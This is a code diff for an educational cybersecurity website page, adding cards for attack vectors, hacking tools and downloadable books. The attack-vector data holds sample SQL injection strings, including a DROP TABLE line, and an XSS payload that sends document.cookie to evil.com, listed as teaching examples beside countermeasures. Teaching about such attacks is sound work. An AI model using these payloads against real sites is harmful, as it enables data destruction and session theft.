@@ -6,9 +6,12 @@ import ChapterSection from '@/components/ChapterSection';
 import VoiceSearch from '@/components/VoiceSearch';
 import { useLanguage } from '@/context/LanguageContext';
 import { LanguageProvider } from '@/context/LanguageContext';
-import { ExternalLink, ShieldAlert, Target, Binary, Database, User, Code, Lock } from 'lucide-react';
+import { ExternalLink, ShieldAlert, Target, Binary, Database, User, Code, Lock, Download, BookOpen, Cpu, Eye, Server, UserCheck, AlertTriangle, Terminal } from 'lucide-react';
 import CyberButton from '@/components/CyberButton';
 import { Button } from '@/components/ui/button';
+import ResourceCard from '@/components/ResourceCard';
+import AttackVectorCard from '@/components/AttackVectorCard';
+import HackingToolCard from '@/components/HackingToolCard';
 
 const Index = () => {
   const { t, language } = useLanguage();
@@ -246,6 +249,235 @@ const Index = () => {
     }
   ];
 
+  const resourceBooks = [
+    {
+      title: "The Art of Human Hacking",
+      author: "Chris Hadnagy",
+      description: "A comprehensive guide to social engineering techniques and psychological manipulation.",
+      imageUrl: "/images/book-social-engineering.jpg",
+      downloadUrl: "https://archive.org/details/social-engineering-the-art-of-human-hacking",
+      category: "Social Engineering",
+      language: "English",
+      pages: 416
+    },
+    {
+      title: "Metasploit: The Penetration Tester's Guide",
+      author: "David Kennedy",
+      description: "Learn how to use the Metasploit Framework for penetration testing and vulnerability assessment.",
+      imageUrl: "/images/book-metasploit.jpg",
+      downloadUrl: "https://archive.org/details/metasploit-the-penetration-testers-guide",
+      category: "Ethical Hacking",
+      language: "English",
+      pages: 328
+    },
+    {
+      title: "Phishing Dark Waters",
+      author: "Chris Hadnagy, Michele Fincher",
+      description: "The offensive and defensive sides of malicious phishing campaigns.",
+      imageUrl: "/images/book-phishing.jpg",
+      downloadUrl: "https://archive.org/details/phishing-dark-waters",
+      category: "Social Engineering",
+      language: "English",
+      pages: 288
+    },
+    {
+      title: "القانون الجنائي الجزائري والجرائم الإلكترونية",
+      author: "د. محمد عبد القادر",
+      description: "تحليل شامل للقوانين الجزائرية المتعلقة بالجرائم الإلكترونية وتطبيقها.",
+      imageUrl: "/images/book-algerian-cyber-law.jpg",
+      downloadUrl: "https://archive.org/details/algerian-cyber-law",
+      category: "Cyber Law",
+      language: "Arabic",
+      pages: 245
+    }
+  ];
+
+  const detailedAttackVectors = [
+    {
+      id: "sql-injection",
+      title: "SQL Injection",
+      icon: Database,
+      description: "A code injection technique used to attack data-driven applications by inserting malicious SQL statements.",
+      technicalDetails: "SQL injection occurs when user-supplied data is not properly validated and directly included in SQL queries. Attackers can bypass authentication, access, modify, or delete data in a database.",
+      examples: [
+        "' OR 1=1 --",
+        "admin' --",
+        "UNION SELECT username,password FROM users--",
+        "'; DROP TABLE users; --"
+      ],
+      countermeasures: [
+        "Use parameterized queries",
+        "Input validation",
+        "Principle of least privilege",
+        "Web Application Firewall (WAF)"
+      ],
+      tools: ["SQLmap", "NoSQLmap", "Havij"],
+      severity: "High"
+    },
+    {
+      id: "xss",
+      title: "Cross-Site Scripting (XSS)",
+      icon: Code,
+      description: "A client-side code injection attack where malicious scripts are injected into websites visited by other users.",
+      technicalDetails: "XSS attacks occur when data enters a web application through an untrusted source, most commonly a web request, and the data is included in dynamic content without proper validation.",
+      examples: [
+        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
+        "<img src=\"x\" onerror=\"alert(1)\">",
+        "<body onload=\"alert('XSS')\">",
+        "<iframe src=\"javascript:alert(`XSS`)\"></iframe>"
+      ],
+      countermeasures: [
+        "Escape output",
+        "Content Security Policy (CSP)",
+        "HttpOnly cookies",
+        "Input sanitization"
+      ],
+      tools: ["XSStrike", "XSSer", "BeEF (Browser Exploitation Framework)"],
+      severity: "Medium"
+    },
+    {
+      id: "social-engineering",
+      title: "Social Engineering",
+      icon: User,
+      description: "Psychological manipulation of people into performing actions or divulging confidential information.",
+      technicalDetails: "Social engineering attacks exploit human psychology rather than technical hacking techniques. Attackers use deception, manipulation, and influence to trick victims.",
+      examples: [
+        "Phishing emails impersonating trusted entities",
+        "Pretexting (creating a fabricated scenario)",
+        "Baiting (offering something enticing to swap)",
+        "Tailgating (following someone into a secured area)"
+      ],
+      countermeasures: [
+        "Security awareness training",
+        "Multi-factor authentication",
+        "Verification procedures",
+        "Zero-trust security model"
+      ],
+      tools: ["Social-Engineer Toolkit (SET)", "GoPhish", "SocialFish"],
+      severity: "High"
+    },
+    {
+      id: "ai-threats",
+      title: "AI-Assisted Attacks",
+      icon: Cpu,
+      description: "Leveraging artificial intelligence to enhance attack capabilities and bypass security controls.",
+      technicalDetails: "AI technologies can be weaponized to increase the scale, speed, and effectiveness of cyberattacks. Techniques include generative AI for targeted phishing, deepfakes, automated vulnerability discovery, and adversarial machine learning.",
+      examples: [
+        "GPT-generated spear phishing emails",
+        "Voice cloning for vishing (voice phishing) attacks",
+        "AI-powered password cracking",
+        "Deepfake video creation for executive impersonation"
+      ],
+      countermeasures: [
+        "AI-based threat detection",
+        "Deepfake detection tools",
+        "Out-of-band verification",
+        "Zero-trust authentication"
+      ],
+      tools: ["DeepFaceLab", "Real-Time Voice Cloning", "GPT models", "Adversarial machine learning frameworks"],
+      severity: "Critical"
+    },
+    {
+      id: "zero-day",
+      title: "Zero-Day Exploits",
+      icon: AlertTriangle,
+      description: "Attacking software vulnerabilities unknown to the vendor and for which no patch exists.",
+      technicalDetails: "Zero-day vulnerabilities represent a window of exposure from the time the vulnerability is discovered until a patch is released. Attackers use techniques like fuzzing, reverse engineering, and code analysis to discover these vulnerabilities.",
+      examples: [
+        "EternalBlue (MS17-010) before the patch",
+        "Log4Shell vulnerability (CVE-2021-44228)",
+        "Heartbleed in OpenSSL (CVE-2014-0160)",
+        "SolarWinds supply chain attack"
+      ],
+      countermeasures: [
+        "Virtual patching",
+        "Defense in depth",
+        "Behavior-based security monitoring",
+        "Network segmentation"
+      ],
+      tools: ["Fuzzing frameworks (AFL, LibFuzzer)", "IDA Pro", "Binary Ninja", "Ghidra"],
+      severity: "Critical"
+    },
+    {
+      id: "iot-hacking",
+      title: "IoT Hacking",
+      icon: Server,
+      description: "Exploiting vulnerabilities in Internet of Things devices to gain unauthorized access or control.",
+      technicalDetails: "IoT devices often have weak security implementations due to resource constraints, legacy protocols, or poor design. Common attack vectors include default credentials, unpatched firmware, and insecure APIs.",
+      examples: [
+        "Mirai botnet targeting default credentials",
+        "MQTT protocol exploitation",
+        "Firmware extraction and analysis",
+        "ZigBee/Z-Wave protocol vulnerabilities"
+      ],
+      countermeasures: [
+        "Network segmentation for IoT devices",
+        "Regular firmware updates",
+        "Strong authentication",
+        "Disable unnecessary services"
+      ],
+      tools: ["Shodan", "Foren6", "RFCrack", "Attify Framework"],
+      severity: "High"
+    }
+  ];
+
+  const hackingTools = [
+    {
+      name: "Kali Linux",
+      category: "Operating System",
+      description: "Security-focused Linux distribution with hundreds of pre-installed penetration testing tools.",
+      icon: Terminal,
+      url: "https://www.kali.org/",
+      complexity: "Medium",
+      usage: "Comprehensive platform for ethical hacking and security assessments"
+    },
+    {
+      name: "Metasploit Framework",
+      category: "Exploitation",
+      description: "Advanced open-source platform for developing, testing, and executing exploits.",
+      icon: Code,
+      url: "https://www.metasploit.com/",
+      complexity: "High",
+      usage: "Vulnerability exploitation, payload generation, and post-exploitation"
+    },
+    {
+      name: "Wireshark",
+      category: "Network Analysis",
+      description: "Network protocol analyzer for capturing and interactively browsing network traffic.",
+      icon: Eye,
+      url: "https://www.wireshark.org/",
+      complexity: "Medium",
+      usage: "Network troubleshooting, analysis, and security assessments"
+    },
+    {
+      name: "Burp Suite",
+      category: "Web Application",
+      description: "Integrated platform for performing security testing of web applications.",
+      icon: Target,
+      url: "https://portswigger.net/burp",
+      complexity: "Medium",
+      usage: "Web vulnerability scanning, interception proxy, and request manipulation"
+    },
+    {
+      name: "John the Ripper",
+      category: "Password Cracking",
+      description: "Fast password cracker for Unix/Linux and Windows users.",
+      icon: Lock,
+      url: "https://www.openwall.com/john/",
+      complexity: "Medium",
+      usage: "Password auditing and recovery"
+    },
+    {
+      name: "SET (Social-Engineer Toolkit)",
+      category: "Social Engineering",
+      description: "Open-source penetration testing framework designed for social engineering attacks.",
+      icon: UserCheck,
+      url: "https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/",
+      complexity: "Medium",
+      usage: "Phishing campaigns, credential harvesting, and social engineering attacks"
+    }
+  ];
+
   return (
     <div className="min-h-screen bg-cyber-dark overflow-x-hidden binary-bg">
       <Navbar />
@@ -328,61 +560,24 @@ const Index = () => {
       {/* Chapter 1: Hacking Strategies */}
       <ChapterSection {...chapter1Data} />
 
-      {/* New Interactive Element: Common Attack Vectors */}
+      {/* Enhanced Attack Vectors Section */}
       <SectionContainer id="attack-vectors" className="bg-cyber-darker">
-        <div className="max-w-4xl mx-auto">
+        <div className="max-w-5xl mx-auto">
           <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
             <h2 className="cyber-heading text-gradient mb-4">{t('attackVectors.title')}</h2>
             <p className="text-xl text-white/70">{t('attackVectors.subtitle')}</p>
           </div>
           
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-10">
+            {detailedAttackVectors.slice(0, 3).map((vector) => (
+              <AttackVectorCard key={vector.id} attackVector={vector} />
+            ))}
+          </div>
+
           <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 animate-on-scroll opacity-0 translate-y-8">
-            {/* SQL Injection Attack Vector */}
-            <div className="cyber-card p-6 rounded-xl hover:scale-105 transition-transform">
-              <div className="flex justify-center mb-4">
-                <Database className="h-12 w-12 text-cyber-accent" />
-              </div>
-              <h3 className="text-xl text-center font-medium text-white mb-3">SQL Injection</h3>
-              <div className="h-1 w-16 bg-gradient-to-r from-cyber-accent to-blue-500 mx-auto mb-4"></div>
-              <p className="text-white/70 text-sm">
-                {t('attackVectors.sqlInjection')}
-              </p>
-              <div className="mt-4 p-2 bg-cyber-darker rounded font-mono text-xs text-cyber-accent">
-                <code>admin' OR 1=1--</code>
-              </div>
-            </div>
-            
-            {/* Cross-Site Scripting Attack Vector */}
-            <div className="cyber-card p-6 rounded-xl hover:scale-105 transition-transform">
-              <div className="flex justify-center mb-4">
-                <Code className="h-12 w-12 text-cyber-accent" />
-              </div>
-              <h3 className="text-xl text-center font-medium text-white mb-3">XSS</h3>
-              <div className="h-1 w-16 bg-gradient-to-r from-cyber-accent to-blue-500 mx-auto mb-4"></div>
-              <p className="text-white/70 text-sm">
-                {t('attackVectors.xss')}
-              </p>
-              <div className="mt-4 p-2 bg-cyber-darker rounded font-mono text-xs text-cyber-accent">
-                <code>&lt;script&gt;fetch('https://evil.com?cookie='+document.cookie)&lt;/script&gt;</code>
-              </div>
-            </div>
-            
-            {/* Social Engineering Attack Vector */}
-            <div className="cyber-card p-6 rounded-xl hover:scale-105 transition-transform">
-              <div className="flex justify-center mb-4">
-                <User className="h-12 w-12 text-cyber-accent" />
-              </div>
-              <h3 className="text-xl text-center font-medium text-white mb-3">{t('attackVectors.socialEngineeringTitle')}</h3>
-              <div className="h-1 w-16 bg-gradient-to-r from-cyber-accent to-blue-500 mx-auto mb-4"></div>
-              <p className="text-white/70 text-sm">
-                {t('attackVectors.socialEngineering')}
-              </p>
-              <div className="mt-4 text-center">
-                <Button variant="outline" className="text-xs cyber-btn-glow">
-                  {t('attackVectors.learnMore')}
-                </Button>
-              </div>
-            </div>
+            {detailedAttackVectors.slice(3, 6).map((vector) => (
+              <AttackVectorCard key={vector.id} attackVector={vector} />
+            ))}
           </div>
         </div>
       </SectionContainer>
@@ -390,7 +585,55 @@ const Index = () => {
       {/* Chapter 2: Legal Framework */}
       <ChapterSection {...chapter2Data} />
 
-      {/* New Interactive Section: Defense Strategies */}
+      {/* New Section: Hacker Toolkit */}
+      <SectionContainer id="hacking-tools" className="bg-cyber-darker">
+        <div className="max-w-5xl mx-auto">
+          <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
+            <h2 className="cyber-heading text-gradient mb-4">{t('hackingTools.title') || "Hacker's Toolkit"}</h2>
+            <p className="text-xl text-white/70">{t('hackingTools.subtitle') || "Professional tools used by security researchers and ethical hackers"}</p>
+          </div>
+          
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 animate-on-scroll opacity-0 translate-y-8">
+            {hackingTools.map((tool, index) => (
+              <HackingToolCard key={index} tool={tool} />
+            ))}
+          </div>
+          
+          <div className="mt-10 text-center">
+            <p className="text-white/70 mb-4">{t('hackingTools.disclaimer') || "Important: These tools should only be used for legal and ethical purposes such as security research, penetration testing with permission, and educational purposes."}</p>
+          </div>
+        </div>
+      </SectionContainer>
+
+      {/* New Section: Free Resources */}
+      <SectionContainer id="resources">
+        <div className="max-w-5xl mx-auto">
+          <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
+            <h2 className="cyber-heading text-gradient mb-4">{t('resources.title') || "Curated Resources"}</h2>
+            <p className="text-xl text-white/70">{t('resources.subtitle') || "Free educational materials to deepen your cybersecurity knowledge"}</p>
+          </div>
+          
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 animate-on-scroll opacity-0 translate-y-8">
+            {resourceBooks.map((book, index) => (
+              <ResourceCard key={index} resource={book} />
+            ))}
+          </div>
+          
+          <div className="mt-10 text-center animate-on-scroll opacity-0 translate-y-8">
+            <div className="cyber-card p-6 rounded-xl">
+              <div className="flex items-center justify-center mb-4">
+                <BookOpen className="text-cyber-accent h-6 w-6 mr-2" />
+                <h3 className="text-xl text-white">{t('resources.legalNotice') || "Legal Notice"}</h3>
+              </div>
+              <p className="text-white/70">
+                {t('resources.legalNoticeText') || "The resources provided are for educational purposes only. The books linked are available through Archive.org and other legal platforms under fair use or open access policies. If you are the copyright holder of any material and believe it has been incorrectly shared, please contact us for immediate removal."}
+              </p>
+            </div>
+          </div>
+        </div>
+      </SectionContainer>
+
+      {/* Defense Strategies */}
       <SectionContainer id="defense-strategies">
         <div className="max-w-4xl mx-auto">
           <div className="text-center mb-12 animate-on-scroll opacity-0 translate-y-8">
